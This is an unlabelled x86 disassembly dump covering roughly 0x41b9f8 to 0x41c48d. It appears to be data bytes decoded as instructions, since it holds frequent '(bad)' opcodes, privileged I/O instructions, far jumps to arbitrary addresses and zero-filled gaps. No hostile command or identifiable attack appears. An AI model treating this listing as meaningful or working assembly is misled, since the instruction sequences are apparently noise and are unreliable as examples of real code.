  41b9f8:	icebp  
  41b9f9:	mov    WORD PTR [edx+edx*8+0x38],es
  41b9fd:	xchg   DWORD PTR [edi+edx*2+0x60],edi
  41ba01:	(bad)  
  41ba02:	dec    BYTE PTR [ebx+0x7d]
  41ba05:	inc    DWORD PTR [eax+0x62]
  41ba08:	jo     0x41b9cf
  41ba0a:	dec    BYTE PTR [ebx+0x7d]
  41ba0d:	or     eax,0x0
	...
  41ba36:	add    BYTE PTR [eax],al
  41ba38:	test   eax,0x348ccf7a
  41ba3d:	shr    BYTE PTR [eax],cl
  41ba3f:	inc    esp
  41ba40:	dec    ebx
  41ba41:	(bad)
  41ba44:	jno    0x41bab1
  41ba46:	loop   0x41ba55
  41ba48:	rcl    DWORD PTR [ecx+0x60],0xc5
  41ba4c:	dec    BYTE PTR [ebx+0x3d]
  41ba4f:	or     eax,0xeef79f9
  41ba54:	inc    esp
  41ba55:	dec    esp
  41ba56:	cmp    eax,0x609a4104
  41ba5b:	push   cs
  41ba5c:	xchg   DWORD PTR [ecx-0x2f90fc11],ebx
  41ba62:	xor    esp,DWORD PTR [eax]
  41ba64:	inc    esi
  41ba65:	shl    BYTE PTR [ebx],1
  41ba67:	and    BYTE PTR [edx],bh
  41ba69:	shr    cl,1
  41ba6b:	les    edx,FWORD PTR [esi]
  41ba6d:	arpl   WORD PTR [edi+0x4],bp
  41ba70:	cmp    eax,edx
  41ba72:	jmp    0x5faca13b
  41ba77:	add    al,0x29
  41ba79:	shr    cl,1
  41ba7b:	(bad)  
  41ba7c:	(bad)  
  41ba7d:	push   edx
  41ba7e:	outs   dx,DWORD PTR ds:[esi]
  41ba7f:	add    al,0x19
  41ba81:	shl    BYTE PTR [edx+0x6aaab944],cl
  41ba87:	lds    eax,FWORD PTR [edx-0x30]
  41ba8a:	out    0x8b,eax
  41ba8c:	aas    
  41ba8d:	shr    cl,1
  41ba8f:	les    esp,FWORD PTR [esi+0x71046f62]
  41ba95:	rol    BYTE PTR [eax],1
  41ba97:	jmp    0x41ba1b
  41ba99:	jb     0x41baab
  41ba9b:	popa   
	...
  41bac4:	add    BYTE PTR [eax],al
  41bac6:	cmp    bh,BYTE PTR [ecx+ecx*4]
  41bac9:	jmp    0x41ba4d
  41bacb:	jb     0x41bad5
  41bacd:	jno    0x41bb09
  41bacf:	cmp    al,0x89
  41bad1:	sti    
  41bad2:	mov    ch,0xaa
  41bad4:	mov    al,ch
  41bad6:	inc    eax
  41bad7:	cdq    
  41bad8:	or     cl,ch
  41bada:	cs aam 0xe3
  41badd:	push   0x59
  41badf:	dec    esi
  41bae0:	push   ecx
  41bae1:	lahf   
  41bae2:	sub    al,0xd2
  41bae4:	inc    ebx
  41bae5:	fnsave [eax+0x53720827]
  41baeb:	ror    BYTE PTR [ebx-0xf],cl
  41baee:	rcl    BYTE PTR [ebx],0x4
  41baf1:	pusha  
  41baf2:	nop
  41baf3:	mov    ebx,0x922ae5e9
  41baf8:	jg     0x41bb04
  41bafa:	inc    esp
  41bafb:	push   0x924aee0d
  41bb00:	xchg   DWORD PTR [edi],edx
  41bb02:	add    al,BYTE PTR [edx-0x1cf447fc]
  41bb08:	(bad)  
  41bb09:	test   al,0x24
  41bb0b:	dec    esp
  41bb0c:	das    
  41bb0d:	scas   eax,DWORD PTR es:[edi]
  41bb0e:	lds    ebp,FWORD PTR [edi+edi*2-0x36]
  41bb12:	out    0x78,eax
  41bb14:	add    cl,ch
  41bb16:	sub    al,0x92
  41bb18:	xchg   DWORD PTR [edi-0x7ef7e03],esp
  41bb1e:	or     esp,ebx
  41bb20:	into   
  41bb21:	test   al,0xd4
  41bb23:	pop    ebp
  41bb24:	das    
  41bb25:	xchg   edi,eax
  41bb26:	mov    ch,0x6c
  41bb28:	jg     0x41bab4
	...
  41bb52:	add    BYTE PTR [eax],al
  41bb54:	xor    ebp,DWORD PTR [ecx+esi*1]
  41bb57:	fisubr DWORD PTR [edx*4-0x7e024879]
  41bb5e:	add    bl,al
  41bb60:	in     al,dx
  41bb61:	loop   0x41bb31
  41bb63:	add    dh,ah
  41bb65:	test   DWORD PTR [eax],ecx
  41bb67:	xor    ecx,ecx
  41bb69:	out    0xef,al
  41bb6b:	xor    DWORD PTR [esp+edx*4+0x4d97ff00],0x9e0189da
  41bb76:	out    0x8,al
  41bb78:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bb7a:	test   DWORD PTR [ebp-0xd],esi
  41bb7d:	pop    ebp
  41bb7e:	test   BYTE PTR [ebx-0x10426d8e],0x60
  41bb85:	(bad)  
  41bb87:	add    esi,ebp
  41bb89:	lea    eax,ds:0x2dacdef9
  41bb8f:	into   
  41bb90:	fimul  WORD PTR [edi-0x37121c83]
  41bb96:	stos   BYTE PTR es:[edi],al
  41bb97:	stos   BYTE PTR es:[edi],al
  41bb98:	jbe    0x41bb52
  41bb9a:	sub    eax,0x124ae2d9
  41bb9f:	mov    DWORD PTR [eax],ecx
  41bba1:	sahf   
  41bba2:	jmp    0x41bbc3
  41bba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bba5:	jl     0x41bba4
  41bba7:	mov    BYTE PTR ds:0xdac7fa65,dh
  41bbad:	xchg   ebp,eax
  41bbae:	or     BYTE PTR [eax],al
  41bbb0:	pop    ss
  41bbb1:	pop    esi
  41bbb2:	test   esi,ecx
  41bbb4:	out    0x7b,al
  41bbb6:	sbb    al,0x89
	...
  41bbe0:	add    BYTE PTR [eax],al
  41bbe2:	loopne 0x41bb80
  41bbe4:	jmp    0x41bbea
  41bbe6:	sahf   
  41bbe7:	pop    DWORD PTR ds:0x7f9c9efb
  41bbed:	shr    bl,0x4e
  41bbf0:	push   ds
  41bbf1:	mov    ecx,edx
  41bbf3:	fsubrp st(6),st
  41bbf5:	aas    
  41bbf6:	pop    esp
  41bbf7:	push   0xffffffb1
  41bbf9:	in     al,0x13
  41bbfb:	push   ds
  41bbfc:	add    BYTE PTR [ecx+0x6eb9d00],cl
  41bc02:	data16 jnp 0x41bc01
  41bc05:	add    BYTE PTR [esi],bh
  41bc07:	test   BYTE PTR [ecx],al
  41bc09:	or     DWORD PTR [ecx+0x3e3f5bdf],ecx
  41bc0f:	jmp    0x41bbc8
  41bc11:	mov    edi,0xe58289a1
  41bc16:	stos   BYTE PTR es:[edi],al
  41bc17:	add    DWORD PTR [ecx],0x0
  41bc1a:	xor    eax,0xff78dd31
  41bc1f:	or     DWORD PTR [edx-0x10d78023],0x7e
  41bc26:	mov    eax,ds:0x3e00010f
  41bc2b:	jge    0x41bbbd
  41bc2d:	in     al,0xf0
  41bc2f:	ret    0x8701
  41bc32:	jmp    0x41bc63
  41bc34:	mov    al,dh
  41bc36:	mov    ebp,0x7586fd43
  41bc3b:	je     0x41bc34
  41bc3d:	xchg   BYTE PTR [eax+0x4],bh
  41bc40:	fistp  QWORD PTR ds:0xe48e8fc5
	...
  41bc6e:	add    BYTE PTR [eax],al
  41bc70:	retf   
  41bc71:	ret    0x901
  41bc74:	retf   
  41bc75:	dec    edi
  41bc76:	mov    bl,ch
  41bc78:	call   DWORD PTR [ecx-0x1]
  41bc7b:	jle    0x41bc96
  41bc7d:	ja     0x41bc81
  41bc7f:	add    BYTE PTR [esi],bh
  41bc81:	jge    0x41bc13
  41bc83:	in     al,0xa5
  41bc85:	ret    
  41bc86:	add    DWORD PTR [edi+0xee5c3f9],eax
  41bc8c:	mov    edi,0x3e00d8a1
  41bc91:	or     BYTE PTR [edx],0xb5
  41bc94:	sbb    cl,BYTE PTR [ebx+eax*2]
  41bc97:	add    bh,al
  41bc99:	rol    ebx,0xed
  41bc9c:	dec    eax
  41bc9d:	add    ebx,ebp
  41bc9f:	cld    
  41bca0:	add    BYTE PTR ds:[ecx],0x9
  41bca4:	test   eax,0x3e3f4d9e
  41bca9:	pop    ebx
  41bcaa:	fcom   st(1)
  41bcac:	mov    ecx,0x2adea891
  41bcb1:	loop   0x41bc71
  41bcb3:	vmaxsd xmm4,xmm5,QWORD PTR [eax-0x2d]
  41bcb8:	inc    ecx
  41bcb9:	je     0x41bd2b
  41bcbb:	mov    esi,0x12e39bbf
  41bcc0:	dec    eax
  41bcc1:	loop   0x41bc58
  41bcc3:	sbb    DWORD PTR [eax-0x32ef9dc8],0x7f
  41bcca:	jecxz  0x41bd10
  41bccc:	ds loop 0x41bd0d
  41bccf:	lds    ebx,FWORD PTR [ebx+0xdf6861]
	...
  41bcfd:	add    BYTE PTR [edx+0x4703e75b],al
  41bd03:	mov    al,0x4b
  41bd05:	pop    edx
  41bd06:	xor    DWORD PTR [ebx+0x70],ebx
  41bd09:	mov    bh,0xa9
  41bd0b:	mov    ch,ah
  41bd0d:	test   BYTE PTR [ebx+0x77],bl
  41bd10:	out    0x3,eax
  41bd12:	ds fs pop esi
  41bd15:	loopne 0x41bced
  41bd17:	sbb    edi,esp
  41bd19:	mov    WORD PTR [ebx-0x66],gs
  41bd1c:	push   es
  41bd1d:	out    dx,al
  41bd1e:	sar    BYTE PTR [edi+0xb],0x4
  41bd22:	ds pop ebx
  41bd24:	repnz mov ds,WORD PTR [edx]
  41bd27:	icebp  
  41bd28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd29:	add    eax,ecx
  41bd2b:	in     eax,dx
  41bd2c:	cli    
  41bd2d:	mov    eax,?
  41bd2f:	(bad)  [edi]
  41bd31:	add    cl,al
  41bd33:	mov    ebx,DWORD PTR [edx]
  41bd35:	idiv   BYTE PTR [eax+0x4bdd6a98]
  41bd3b:	in     al,0x1b
  41bd3d:	xchg   ecx,eax
  41bd3e:	sbb    dh,dh
  41bd40:	daa    
  41bd41:	add    al,0x47
  41bd43:	out    dx,al
  41bd44:	mov    edx,0xce9a138c
  41bd49:	std    
  41bd4a:	push   0x3db50080
  41bd4f:	pop    ebx
  41bd50:	add    dl,ah
  41bd52:	enter  0x797e,0x28
  41bd56:	cmp    ah,al
  41bd58:	(bad)  [eax-0x71809720]
  41bd5e:	jmp    0x12abdbd
	...
  41bd8b:	add    BYTE PTR [esi+ebp*4-0x1c],al
  41bd8f:	add    bl,bh
  41bd91:	pop    edx
  41bd92:	xchg   DWORD PTR [esi+0x68168582],ebx
  41bd98:	xor    BYTE PTR [esi+0x0],0xe9
  41bd9c:	cmp    eax,0x4db562
  41bda1:	cmp    BYTE PTR [eax],al
  41bda3:	sbb    BYTE PTR [ebx+0x75],dh
  41bda6:	dec    ebx
  41bda7:	push   ecx
  41bda8:	mov    esp,0x40e9f7f3
  41bdad:	fsubr  QWORD PTR [ecx-0x788a77b9]
  41bdb3:	xor    DWORD PTR [edx+0x7b601d7a],eax
  41bdb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdba:	out    dx,al
  41bdbb:	pusha  
  41bdbc:	sbb    BYTE PTR [edi-0x11],0x70
  41bdc0:	lea    eax,[edi-0x38]
  41bdc3:	jo     0x41be41
  41bdc5:	mul    eax
  41bdc7:	inc    ebx
  41bdc8:	xchg   edi,eax
  41bdc9:	les    ebp,FWORD PTR [edx-0x28b90828]
  41bdcf:	jo     0x41bdbe
  41bdd1:	mov    dh,0xe0
  41bdd3:	fidivr WORD PTR [edx-0x4df83073]
  41bdd9:	cdq    
  41bdda:	pop    es
  41bddb:	sti    
  41bddc:	lds    ecx,FWORD PTR [ebx+0x4642d1bf]
  41bde2:	enter  0xff70,0xf6
  41bde6:	loopne 0x41bdbe
  41bde8:	cmp    bh,BYTE PTR [eax+0x0]
  41bdeb:	sbb    BYTE PTR [ebp+0xd8de],dh
	...
  41be19:	add    BYTE PTR [esi-0x6acef781],ah
  41be1f:	loop   0x41bdf1
  41be21:	sar    edi,0x59
  41be24:	sub    eax,0x7d9c5ec8
  41be29:	jecxz  0x41be1f
  41be2b:	dec    ebx
  41be2c:	das    
  41be2d:	xor    esp,esi
  41be2f:	mov    cl,0x85
  41be31:	fcom   DWORD PTR [esi-0x1acefd81]
  41be37:	loop   0x41be01
  41be39:	ror    edi,0x6f
  41be3c:	shr    BYTE PTR cs:[esi],1
  41be3f:	pushf  
  41be40:	jge    0x41be25
  41be42:	sub    BYTE PTR [eax-0x4b2a0000],dl
  41be48:	test   eax,ebx
  41be4a:	data16 jg 0x41be5d
  41be4d:	xor    DWORD PTR [esi-0x1e],edx
  41be50:	enter  0xffc1,0x5a
  41be54:	sub    eax,0x7d9bded0
  41be59:	jecxz  0x41bec3
  41be5b:	pop    edi
  41be5c:	or     ecx,DWORD PTR [edi]
  41be5e:	data16 mov ah,0x87
  41be61:	inc    ebp
  41be62:	pop    edi
  41be63:	cdq    
  41be64:	fild   WORD PTR [esi+edx*2]
  41be67:	mov    ds:0x35e41885,eax
  41be6c:	or     BYTE PTR [esp+ecx*8],al
  41be6f:	xor    eax,0x2f478908
  41be74:	pop    esi
  41be75:	pop    ebx
  41be76:	sahf   
  41be77:	sbb    DWORD PTR [ecx-0x3e],0x2f
  41be7b:	pop    edx
  41be7c:	dec    edi
  41be7d:	push   esi
	...
  41bea6:	add    BYTE PTR [eax],al
  41bea8:	lods   al,BYTE PTR ds:[esi]
  41bea9:	xor    esp,DWORD PTR [esp+ecx*1]
  41beac:	mov    cl,0xe2
  41beae:	je     0x41bed4
  41beb0:	not    DWORD PTR [edi]
  41beb2:	xor    esi,0xfcd0608
  41beb8:	mov    cl,0x98
  41beba:	or     esi,DWORD PTR [edi-0x74ce3bc2]
  41bec0:	jge    0x41bf3e
  41bec2:	xor    eax,ebp
  41bec4:	mov    ebx,DWORD PTR [edx-0x5fa9022c]
  41beca:	dec    ebp
  41becb:	aas    
  41becc:	ds pushf 
  41bece:	or     ah,bh
  41bed0:	fld    st(4)
  41bed2:	add    al,0xb5
  41bed4:	enter  0x2f35,0xe8
  41bed8:	jg     0x41be94
  41beda:	aam    0xfd
  41bedc:	push   esi
  41bedd:	push   0xdc3e3f4d
  41bee2:	int3   
  41bee3:	stc    
  41bee4:	mov    cl,0xdc
  41bee6:	xor    ebx,DWORD PTR [ecx+0x7c]
  41bee9:	imul   eax,DWORD PTR [ecx],0x53
  41beec:	mov    bh,0xe6
  41beee:	xor    DWORD PTR [eax-0x13],edx
  41bef1:	clc    
  41bef2:	cmp    eax,0x59ec508
  41bef7:	mov    esi,ebx
  41bef9:	sti    
  41befa:	cs push eax
  41befc:	xchg   esi,eax
  41befd:	mov    esi,0x9b79fdd5
  41bf02:	pop    ebp
  41bf03:	je     0x41bf04
  41bf05:	add    DWORD PTR [esi-0x162c99bd],0xfffffff5
	...
  41bf34:	add    BYTE PTR [eax],al
  41bf36:	bound  ebp,QWORD PTR [esp+edx*8]
  41bf39:	push   0x42af62
  41bf3e:	ret    
  41bf3f:	(bad)  
  41bf40:	fst    DWORD PTR [eax+0x56]
  41bf43:	dec    edx
  41bf44:	aad    0xfd
  41bf46:	inc    ecx
  41bf47:	fistp  DWORD PTR [ebp+0x73]
  41bf4a:	jg     0x41bece
  41bf4c:	xchg   BYTE PTR [ebx+0x36],al
  41bf4f:	shr    ecx,cl
  41bf51:	fldcw  WORD PTR [edx]
  41bf53:	jbe    0x41bf26
  41bf55:	push   ecx
  41bf56:	mov    bl,0xc7
  41bf58:	fst    DWORD PTR [eax+0x26]
  41bf5b:	add    ebp,edx
  41bf5d:	std    
  41bf5e:	adc    DWORD PTR [edx+eax*2+0x7d],ebx
  41bf62:	sbb    dl,BYTE PTR [edi]
  41bf64:	test   eax,0x601001fc
  41bf69:	jmp    0x3739472d
  41bf6e:	mov    al,ah
  41bf70:	and    al,0xfc
  41bf72:	mov    dh,0xee
  41bf74:	jmp    0xe637:0x17737d80
  41bf7b:	jno    0x41bf2f
  41bf7d:	rcl    ebx,cl
  41bf7f:	out    0x2c,al
  41bf81:	aam    0x6e
  41bf83:	fsubr  DWORD PTR [edx-0x7b7c9104]
  41bf89:	iret   
  41bf8a:	mov    ebx,0x2a67ff74
  41bf8f:	sbb    ah,bh
  41bf91:	cmp    ch,0x72
  41bf94:	pop    ss
  41bf95:	fmul   st(3),st
  41bf97:	ja     0x41c00f
  41bf99:	rol    DWORD PTR [eax],cl
	...
  41bfc3:	add    BYTE PTR [esi],ah
  41bfc5:	push   edx
  41bfc7:	inc    esp
  41bfc8:	ds out 0xac,al
  41bfcb:	shr    esi,cl
  41bfcd:	xor    BYTE PTR [eax-0x30],0x83
  41bfd1:	je     0x41c035
  41bfd3:	xor    DWORD PTR [edx-0x20],edi
  41bfd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfd7:	sar    DWORD PTR [ecx+0x57d431e],cl
  41bfdd:	imul   ecx,edi,0xffffffe7
  41bfe0:	jmp    0x9772:0xfd80e719
  41bfe7:	fninit 
  41bfe9:	jbe    0x41c011
  41bfeb:	rcl    esi,cl
  41bfed:	jle    0x41bf82
  41bfef:	inc    esp
  41bff0:	ds out 0xac,al
  41bff3:	ror    DWORD PTR [esi+0x33cf8883],cl
  41bff9:	je     0x41c06d
  41bffb:	xor    DWORD PTR [edx],ebp
  41bffd:	loopne 0x41bfa3
  41bfff:	sar    DWORD PTR [ecx-0x650affe3],cl
  41c005:	adc    al,dh
  41c007:	sbb    DWORD PTR [ecx-0x4116c118],0xe239f817
  41c011:	sbb    eax,0x30cd6fc
  41c016:	fs push esp
  41c018:	jnp    0x41c075
  41c01a:	mov    ebp,DWORD PTR [edx+edx*1]
  41c01d:	or     ebp,eax
  41c01f:	add    BYTE PTR [esi],cl
  41c021:	jbe    0x41c020
  41c023:	pop    ds
  41c024:	mov    edi,0x19f817
	...
  41c051:	add    dl,dh
  41c053:	jp     0x41c04e
  41c055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c056:	in     al,dx
  41c057:	fld    st(6)
  41c059:	icebp  
  41c05a:	pop    es
  41c05b:	loopne 0x41c0a0
  41c05d:	cdq    
  41c05e:	ins    DWORD PTR es:[edi],dx
  41c05f:	adc    ecx,0xffffff92
  41c062:	mov    WORD PTR [ebp+0x5e],?
  41c065:	and    ch,BYTE PTR [ebx]
  41c067:	xchg   DWORD PTR [ebx-0x55],ebx
  41c06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06b:	jae    0x41c0c1
  41c06d:	pusha  
  41c06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c06f:	repz jmp 0x41c0cf
  41c072:	cmp    bl,BYTE PTR [ebx+0x0]
  41c075:	mov    edx,0xbc890e47
  41c07a:	test   edx,esp
  41c07c:	jae    0x41c063
  41c07e:	mov    esi,0x8c4f80d7
  41c083:	jne    0x41c0d5
  41c085:	push   ecx
  41c086:	into   
  41c087:	jae    0x41c086
  41c089:	jmp    0x4daa1b91
  41c08e:	div    BYTE PTR [ebx]
  41c090:	add    BYTE PTR [ecx-0x36],al
  41c093:	je     0x41c092
  41c095:	xor    cl,BYTE PTR es:[ecx-0x18a69476]
  41c09c:	ds jmp 0xab741857
  41c0a2:	mov    eax,0xc3000875
  41c0a7:	xchg   ebx,eax
  41c0a9:	test   DWORD PTR [edi+0x26fffb8c],edi
  41c0af:	pop    edi
  41c0b0:	add    BYTE PTR [eax],al
  41c0b2:	cmp    al,0x2a
  41c0b4:	test   eax,esi
	...
  41c0de:	add    BYTE PTR [eax],al
  41c0e0:	mov    ds,edx
  41c0e2:	je     0x41c0e2
  41c0e4:	loopne 0x41c072
  41c0e6:	sub    eax,0x8747fcd2
  41c0eb:	test   DWORD PTR [ebx+0x6efffb8d],ecx
  41c0f1:	fidivr DWORD PTR [esi+edi*8-0x60]
  41c0f5:	mov    ebx,?
  41c0f7:	test   DWORD PTR [ebx],ebx
  41c0f9:	(bad)  
  41c0fa:	sti    
  41c0fb:	call   FWORD PTR [edx+esi*8+0x7b]
  41c0ff:	(bad)  
  41c100:	mov    al,ds:0xd4be0b8c
  41c105:	xlat   BYTE PTR ds:[ebx]
  41c106:	loopne 0x41c187
  41c108:	sbb    al,0xe2
  41c10a:	jl     0x41c10a
  41c10c:	ror    BYTE PTR [ebx+ecx*1-0x7b27f4a],0x88
  41c114:	xchg   esi,eax
  41c115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c116:	(bad)  
  41c117:	jmp    DWORD PTR [ecx+ebx*1+0x7f]
  41c11b:	cli    
  41c11c:	lahf   
  41c11d:	and    DWORD PTR [ecx],eax
  41c11f:	sbb    BYTE PTR [edi+edx*2+0x71],0xc6
  41c124:	leave  
  41c125:	xor    al,0xe8
  41c127:	imul   edx,DWORD PTR [ecx],0xffffff8c
  41c12a:	sti    
  41c12b:	cmp    DWORD PTR [edx+0xfffe1f],0x57
  41c132:	cmp    BYTE PTR [ebx],0x57
  41c135:	or     DWORD PTR [ebx-0x1e12d7d],esp
  41c13b:	jmp    DWORD PTR [eax]
  41c13d:	push   edi
  41c13e:	jno    0x41c0de
  41c140:	rcr    cl,cl
  41c142:	cmp    dh,0x0
	...
  41c16d:	add    BYTE PTR [eax],ah
  41c16f:	mov    WORD PTR [eax-0x18],ss
  41c172:	ds loope 0x41c177
  41c175:	add    BYTE PTR [esi],bh
  41c177:	shr    DWORD PTR [edi],0x59
  41c17a:	mov    bh,0x47
  41c17c:	sub    eax,0x368436c2
  41c181:	xchg   DWORD PTR [ebx],esp
  41c183:	add    esp,eax
  41c185:	mov    WORD PTR [edi],?
  41c187:	test   BYTE PTR [ecx],al
  41c189:	push   ecx
  41c18a:	jo     0x41c1bd
  41c18c:	jnp    0x41c1e9
  41c18e:	ss in  eax,dx
  41c190:	push   ebp
  41c191:	or     al,0xcb
  41c193:	inc    BYTE PTR [eax+0x31a0f1fe]
  41c199:	call   0x434587
  41c19e:	push   esp
  41c19f:	test   BYTE PTR [ecx-0x1c],bl
  41c1a2:	push   ebx
  41c1a3:	inc    ebx
  41c1a4:	add    al,0xe8
  41c1a6:	in     eax,dx
  41c1a7:	mov    esi,0xb60ffdd0
  41c1ac:	jnp    0x41c130
  41c1ae:	fiadd  DWORD PTR [esi+0x41]
  41c1b1:	add    dh,al
  41c1b3:	jg     0x41c1c8
  41c1b5:	inc    edx
  41c1b6:	mov    ebp,0xaf7bf1cd
  41c1bb:	rol    BYTE PTR [esi-0x300f5f88],0xff
  41c1c2:	cdq    
  41c1c3:	add    DWORD PTR [ecx],0xffffffe9
  41c1c6:	jmp    0xcf8f:0xc387d0fa
  41c1cd:	std    
  41c1ce:	adc    DWORD PTR [edx-0x4a],0xe9
	...
  41c1f9:	add    BYTE PTR [eax],al
  41c1fb:	add    BYTE PTR [esi],ch
  41c1fd:	std    
  41c1fe:	test   DWORD PTR [eax+esi*2+0x20],esi
  41c202:	rol    BYTE PTR [edi-0x230683d],1
  41c208:	popa   
  41c209:	xor    BYTE PTR [esi-0x2fd7a78c],al
  41c20f:	mov    ebx,eax
  41c211:	mov    edi,0x5a49fdcf
  41c216:	not    BYTE PTR [ecx+0x5007de3f]
  41c21c:	(bad)  
  41c21d:	scas   al,BYTE PTR es:[edi]
  41c21e:	xchg   ebx,eax
  41c21f:	shl    DWORD PTR [ebx],1
  41c221:	jno    0x41c201
  41c223:	cdq    
  41c224:	imul   ebp,DWORD PTR [edx],0xffffffff
  41c227:	jp     0x41c24a
  41c229:	xchg   edi,eax
  41c22a:	jmp    0x2ecd:0x6a1d7f03
  41c231:	out    dx,al
  41c232:	jecxz  0x41c1b7
  41c234:	inc    edi
  41c235:	pop    ebx
  41c236:	pop    esp
  41c237:	(bad)  
  41c238:	push   0xf5cecf09
  41c23d:	jo     0x41c215
  41c23f:	sbb    DWORD PTR [ebp-0x1430330d],0x5b
  41c246:	or     edi,DWORD PTR ds:0x85e6
  41c24b:	adc    DWORD PTR [ebp-0x2c304b0d],0x5b
  41c252:	xor    al,0x6e
  41c254:	mov    ch,0xd6
  41c256:	addr16 into 
  41c258:	ret    
  41c259:	jo     0x41c292
  41c25b:	fsubr  st(1),st
  41c25d:	pop    ebx
  41c25e:	out    0x3,eax
	...
  41c288:	add    BYTE PTR [eax],al
  41c28a:	adc    edx,DWORD PTR [ecx]
  41c28c:	xor    bh,BYTE PTR [ebp-0x66]
  41c28f:	push   cs
  41c290:	test   eax,0x150da1fc
  41c295:	aaa    
  41c296:	(bad)  
  41c297:	pop    ss
  41c298:	retf   
  41c299:	repz sbb esp,esp
  41c29c:	or     ebp,DWORD PTR [eax]
  41c29e:	xor    bh,cl
  41c2a0:	imul   ebp,DWORD PTR [ebx-0x398f9bf3],0xffffffc5
  41c2a7:	repz mul BYTE PTR [ebp-0x4c]
  41c2ab:	pop    edx
  41c2ac:	out    0xda,eax
  41c2ae:	fidiv  WORD PTR ss:[edi-0x3a67470d]
  41c2b5:	adc    al,0x6c
  41c2b7:	pusha  
  41c2b8:	add    BYTE PTR [esi-0x74],bh
  41c2bb:	or     eax,0x204a2981
  41c2c0:	call   0xfdb02c32
  41c2c5:	xchg   ecx,eax
  41c2c6:	and    edi,esp
  41c2c8:	ds jmp 0xf38f7e3
  41c2ce:	stc    
  41c2cf:	pop    ebp
  41c2d0:	mov    ch,0x22
  41c2d2:	ins    DWORD PTR es:[edi],dx
  41c2d3:	push   es
  41c2d4:	call   0xfdafb352
  41c2d9:	sbb    DWORD PTR [ecx-0x1a16c114],0xf0e6f738
  41c2e3:	pop    ebp
  41c2e4:	mov    ch,0xc2
  41c2e6:	sub    al,0x9
  41c2e8:	call   0xfdafcc22
  41c2ed:	add    BYTE PTR cs:[eax],al
	...
  41c318:	sbb    BYTE PTR [edx],dl
  41c31a:	ret    0x3df1
  41c31d:	or     cl,BYTE PTR [ecx+0x5163261d]
  41c323:	rcl    esp,0x68
  41c326:	std    
  41c327:	scas   al,BYTE PTR es:[edi]
  41c328:	ret    0x8099
  41c32b:	jmp    0x85fa1e6d
  41c330:	adc    DWORD PTR [eax],esi
  41c332:	add    BYTE PTR [edx-0x53],ah
  41c335:	fcom   DWORD PTR [ecx]
  41c337:	push   0x7d
  41c339:	push   esi
  41c33a:	sub    DWORD PTR [edx-0xb9bcbc7],0x86725b02
  41c344:	(bad)
  41c347:	sub    BYTE PTR [edx-0x1e],al
  41c34a:	adc    BYTE PTR [eax-0x74],dh
  41c34d:	fcmovb st,st(0)
  41c34f:	in     eax,0xbc
  41c351:	cdq    
  41c352:	add    al,0x14
  41c354:	data16 jmp 0x41c395
  41c357:	jmp    0x9b416b
  41c35c:	adc    eax,0xcc530058
  41c361:	aas    
  41c362:	and    al,0x8
  41c364:	mov    ah,0x93
  41c366:	call   0x7de2dc63
  41c36b:	ret    
  41c36c:	xlat   BYTE PTR ds:[ebx]
  41c36d:	pop    ebx
  41c36e:	add    BYTE PTR [eax],al
  41c370:	lahf   
  41c371:	jbe    0x41c3e7
  41c373:	inc    ecx
  41c374:	daa    
  41c375:	repnz push cs
  41c377:	mov    DWORD PTR [edi],esp
  41c379:	fidivr DWORD PTR [edi+0x4]
	...
  41c3a3:	add    BYTE PTR [eax],al
  41c3a5:	add    BYTE PTR [edx+ebx*4+0x13c33d04],dl
  41c3ac:	cmp    eax,0xb88d9500
  41c3b1:	fs xchg edx,eax
  41c3b3:	pop    ss
  41c3b4:	add    BYTE PTR [ebx-0x7cf00dfc],cl
  41c3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3bb:	arpl   WORD PTR [edi-0x40],di
  41c3be:	jecxz  0x41c41d
  41c3c0:	in     al,0x75
  41c3c2:	push   ss
  41c3c3:	push   edi
  41c3c4:	jb     0x41c3b5
  41c3c6:	sbb    al,0x99
  41c3c8:	add    al,0x0
  41c3ca:	xor    dh,dl
  41c3cc:	loopne 0x41c351
  41c3ce:	sti    
  41c3cf:	jg     0x41c421
  41c3d1:	push   esi
  41c3d2:	pop    esp
  41c3d3:	or     BYTE PTR ds:[ebx+0x45895b22],cl
  41c3da:	fbld   TBYTE PTR [edi]
  41c3dc:	dec    edi
  41c3dd:	call   0x3d639c
  41c3e2:	or     dl,BYTE PTR [esi]
  41c3e4:	lock push eax
  41c3e6:	sub    bl,BYTE PTR [eax+ecx*1]
  41c3e9:	push   eax
  41c3ea:	scas   eax,DWORD PTR es:[edi]
  41c3eb:	ja     0x41c3e5
  41c3ed:	dec    DWORD PTR [eax]
  41c3ef:	out    dx,al
  41c3f0:	inc    eax
  41c3f1:	call   0x1101a01d
  41c3f6:	les    edx,FWORD PTR [edx-0x5fe70731]
  41c3fc:	push   0x42903e64
  41c401:	add    BYTE PTR [ebx+0x5650c9b7],bh
  41c407:	xchg   edi,eax
  41c408:	retf   0xfd
	...
  41c433:	add    BYTE PTR [ecx-0x74],bl
  41c436:	gs je  0x41c438
  41c439:	cmp    DWORD PTR [esi+0x43],0x4e
  41c43d:	aam    0xd9
  41c43f:	ins    DWORD PTR es:[edi],dx
  41c440:	inc    edi
  41c441:	xor    eax,0xc8a268cb
  41c446:	inc    edx
  41c447:	add    bl,al
  41c449:	mov    esi,0xe31650d9
  41c44e:	retf   0x21fd
  41c451:	jmp    0xb707c082
  41c456:	rol    DWORD PTR [edi+0x5b7a687b],1
  41c45c:	push   cs
  41c45d:	stc    
  41c45e:	sub    al,0xf4
  41c460:	mov    ch,0x3e
  41c462:	fadd   QWORD PTR [edi+0x5b7a8883]
  41c468:	out    0x1b,al
  41c46a:	call   0x7ec643e3
  41c46f:	inc    ebx
  41c470:	out    0x53,al
  41c472:	fdivr  QWORD PTR [ecx]
  41c474:	xlat   BYTE PTR ds:[ebx]
  41c475:	lods   al,BYTE PTR ds:[esi]
  41c476:	int3   
  41c477:	push   0x412fda
  41c47c:	mov    ebx,0xd650d436
  41c481:	xchg   dl,cl
  41c483:	std    
  41c484:	mov    ecx,0xff74e84b
  41c489:	cmp    DWORD PTR [esi+0x43],0xffffff96
  41c48d:	xor    ebx,esp
